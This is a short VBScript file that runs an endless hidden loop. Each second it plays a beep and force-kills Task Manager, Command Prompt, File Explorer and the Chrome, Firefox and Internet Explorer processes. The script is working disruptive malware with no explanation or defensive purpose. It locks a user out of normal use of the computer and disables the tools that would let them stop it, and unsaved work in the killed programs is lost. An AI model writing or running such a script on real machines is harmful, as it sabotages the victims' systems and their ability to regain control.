Set objShell = CreateObject("WScript.Shell")

Do While True
    ' Play a beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True

    ' Close Task Manager
    objShell.Run "taskkill /f /im taskmgr.exe", 0, True

    ' Close Command Prompt
    objShell.Run "taskkill /f /im cmd.exe", 0, True

    ' Close File Explorer
    objShell.Run "taskkill /f /im explorer.exe", 0, True

    ' Close any browser
    objShell.Run "taskkill /f /im chrome.exe", 0, True
    objShell.Run "taskkill /f /im firefox.exe", 0, True
    objShell.Run "taskkill /f /im iexplore.exe", 0, True

    ' Wait for a second
    WScript.Sleep 1000
Loop
